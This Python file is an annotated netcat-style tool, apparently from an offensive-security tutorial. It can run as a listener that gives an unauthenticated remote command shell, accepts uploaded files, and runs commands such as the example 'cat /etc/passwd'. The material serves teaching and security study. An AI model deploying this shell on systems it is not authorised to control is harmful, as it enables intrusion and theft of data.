
import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


# set up the execute function, which receives a command, runs it, and returns the output as a string
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd),
                                     stderr=subprocess.STDOUT)
    return output.decode()


# We initialize the NetCat object with the arguments from the command line and the buffer
# noinspection PyShadowingNames
class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        # and then create the socket object.
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # The run method, which is the entry point for managing the NetCat object,
    # is pretty simple: it delegates execution to two methods. If we’re setting up a
    # listener, we call the listen method 3. Otherwise, we call the send method 4
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        # we connect to the target and port
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

            # start a loop, to receive data from the target. We use a try/catch block, so we can manually halt
            # the connection using CTRL+C
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()

                    # If there is no more data we break out of the loop. Otherwise, we print the response data and
                    # pause to get interactive input, send that input, and continue the loop.
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())

        # The loop will continue until the KeyboardInterrupt occurs (CTRL-C), which will close the socket.
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()


# main block responsible for handling the command line args.
if __name__ == '__main__':

    # We use the argparse module from the standard library to create a command line interface.
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,

        # provide arguments, so it can be invoked to upload a file, execute a command, or start a command shell
        # We provide example usage that the program will display when the user invokes it with --help
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
            netcat.py -t 192.168.1.108 -p 5555 -l -e\"cat /etc/passwd\" # execute command
            echo 'ABCDEFGHI' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
        '''))

    # The -c argument sets up an interactive shell,
    # the -e argument executes one specific command,
    # the -l argument indicates that a listener should be set up,
    # the -p argument specifies the port on which to communicate,
    # the -t argument specifies the target IP,
    # the -u argument specifies the name of a file to upload.
    # Both the sender and receiver can use this program, so the arguments define whether it’s invoked to send or
    # listen. The -c, -e, and -u arguments imply the -l argument, because those arguments apply to only the listener
    # side of the communication. The sender side makes the connection to the listener, and so it needs
    # only the -t and -p arguments to define the target listener
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()

    # If we’re setting it up as a listener, we invoke the NetCat object with an empty buffer string.
    # Otherwise, we send the buffer content from stdin.
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    # Finally, we call the run method to start it up.
    nc = NetCat(args, buffer.encode())
    nc.run()
